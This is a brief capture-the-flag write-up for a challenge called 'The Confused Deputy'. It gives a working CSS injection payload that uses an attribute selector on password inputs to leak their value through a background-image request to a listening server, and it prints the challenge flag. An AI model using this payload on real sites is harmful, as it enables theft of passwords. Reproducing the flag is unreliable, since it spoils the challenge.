# The Confused Deputy

Author: [roerohan](https://github.com/roerohan)

## Description

This website can be exploited with the help of CSS Injection.

## Requirements

- Docker: [Dockerfile](./Dockerfile)
- Node.js

## Sources

```
Wow that's a pretty color! Don't you think?
```

## Exploit

Payload:
<br />

```
blue;} input[type="password"][value^="csictf"] {background-image: url('http://localhost:8000?csictf');
```

<br />

The flag is:

```
csictf{cssxss}
```